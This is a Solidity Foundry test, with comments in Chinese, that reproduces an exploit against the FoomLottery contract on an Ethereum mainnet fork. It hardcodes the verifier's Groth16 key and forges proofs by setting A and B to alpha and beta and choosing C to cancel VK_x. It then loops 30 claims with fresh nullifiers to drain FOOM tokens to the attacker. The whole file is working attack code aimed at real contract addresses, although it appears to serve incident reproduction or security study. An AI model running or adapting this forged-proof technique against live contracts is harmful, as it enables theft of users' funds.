// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}
interface IFoomLottery {
    function lastRoot() external view returns (uint256);
    function collect(
        uint[2] calldata _pA,
        uint[2][2] calldata _pB,
        uint[2] calldata _pC,
        uint _root,
        uint _nullifierHash,
        address _recipient,
        address _relayer,
        uint _fee,
        uint _refund,
        uint _rewardbits,
        uint _invest
    ) external payable;
}

contract FoomExp is Test {
    // 地址配置 (请根据实际测试网环境修改)
    IFoomLottery lottery = IFoomLottery(0x239AF915abcD0a5DCB8566e863088423831951f8); 
    IERC20 foom = IERC20(0xd0D56273290D339aaF1417D9bfa1bb8cFe8A0933);
    // 基域 p (Base field)
    uint256 constant q = 21888242871839275222246405745257275088696311157297823662689037894645226208583;

    // SRS / Verification Key (摘自用户提供的数据)
    uint256 constant alphax = 16428432848801857252194528405604668803277877773566238944394625302971855135431;
    uint256 constant alphay = 16846502678714586896801519656441059708016666274385668027902869494772365009666;
    uint256 constant betax1  = 3182164110458002340215786955198810119980427837186618912744689678939861918171;
    uint256 constant betax2  = 16348171800823588416173124589066524623406261996681292662100840445103873053252;
    uint256 constant betay1  = 4920802715848186258981584729175884379674325733638798907835771393452862684714;
    uint256 constant betay2  = 19687132236965066906216944365591810874384658708175106803089633851114028275753;
    // IC 点硬编码
    uint256[2] IC0 = [18034728625187359240665687008203446290525175909013610993380285560790626416205, 4838911559208885749525813755160034705362283044332640132147474767273110276364];
    uint256[2] IC1 = [20645225571373678250368938393184144061643217843784195126034630470613271045128, 6288099123069650552200194646860554847870547844848526797688131113668253881456];
    uint256[2] IC2 = [4852905862447562718278474935403876771227407113171832528653029050154354910538, 10065332012865665165743435938337559973984855860539738446902174508538633784913];
    uint256[2] IC3 = [16534893255917854017020795101427343900183846939280659911923075937160731921404, 19951628886467480903880394947569247180415085617787513331070867180467687700363];
    uint256[2] IC4 = [18732305876480415018530597970140394989870247575757726629755216678954111960954, 9232068287814360066272749902975933578271857215778307427653520408208786597393];
    uint256[2] IC5 = [3472174801853114636158727296932603219359565814166029542144600155697980953310, 16270067650415813887886157948744333258971959015203208043429755256233596173851];
    uint256[2] IC6 = [19605704167701392499887549367903988794115704858383813047741407366537936442336, 9440834128322247987275843876415344980272732833183979934166072763619891867444];
    uint256[2] IC7 = [16744559741585895609495991030152364629966600022083245690889161622181634055968, 17949893469576622609510516859158006408203704978285886568902149828372740483144];

    function setUp() public {
        vm.createSelectFork("eth", 24_539_650 - 1);
    }
    function testExploit() public {
        uint256 root = lottery.lastRoot();
        uint256 baseNullifier = uint256(keccak256("0xdead0000"));
        address attacker = address(this);
        
        // pA and pB remain constant as they represent alpha and beta
        uint[2] memory pA = [alphax, alphay];
        uint[2][2] memory pB = [
            [betax1, betax2],
            [betay1, betay2]
        ];
        
        console.log("Exploit before. Attacker's FOOM balance: ", foom.balanceOf(address(this)));
        console.log("Starting batch exploit of 30 iterations...");

        // Reconstruct public signals for each iteration
        uint256[] memory signals = new uint256[](7);
        signals[0] = root;
        signals[2] = 7; // Max rewards
        signals[3] = uint256(uint160(attacker));
        signals[4] = 0; signals[5] = 0; signals[6] = 0;

        for (uint i = 0; i < 30; i++) {
            uint256 currentNullifier = baseNullifier + i;
            signals[1] = currentNullifier; // Changing this triggers a new pC requirement

            // Recalculate VK_x based on the updated nullifier
            (uint256 vkx, uint256 vky) = computeVKx(signals);

            // C must be the inverse of the new VK_x to satisfy: e(A,B) = e(alpha, beta) * e(VK_x + C, gamma)
            uint[2] memory pC = [vkx, q - vky];

            // Execute the forged claim
            try lottery.collect(
                pA, pB, pC,
                root, currentNullifier, attacker, address(0), 0, 0, 7, 0
            ) {
                // Success
            } catch {
                console.log("Iteration failed at:", i);
                break;
            }
        }
        
        console.log("Exploit finished. Attacker's FOOM balance: ", foom.balanceOf(address(this)));
    }

    /// @dev 利用 0x6 (ecAdd) 和 0x7 (ecMul) 计算 [VK_x]1
    function computeVKx(uint256[] memory x) internal returns (uint256, uint256) {
        uint256[2] memory res = IC0;
        uint256[2][7] memory ICs = [IC1, IC2, IC3, IC4, IC5, IC6, IC7];

        for (uint i = 0; i < x.length; i++) {
            uint256[2] memory term = ecMul(ICs[i][0], ICs[i][1], x[i]);
            res = ecAdd(res[0], res[1], term[0], term[1]);
        }
        return (res[0], res[1]);
    }

    // --- 预编译合约封装 ---

    function ecAdd(uint256 x1, uint256 y1, uint256 x2, uint256 y2) internal returns (uint256[2] memory res) {
        uint256[4] memory input = [x1, y1, x2, y2];
        assembly {
            if iszero(call(gas(), 0x06, 0, input, 0x80, res, 0x40)) {
                revert(0, 0)
            }
        }
    }

    function ecMul(uint256 x, uint256 y, uint256 scalar) internal returns (uint256[2] memory res) {
        uint256[3] memory input = [x, y, scalar];
        assembly {
            if iszero(call(gas(), 0x07, 0, input, 0x60, res, 0x40)) {
                revert(0, 0)
            }
        }
    }
}
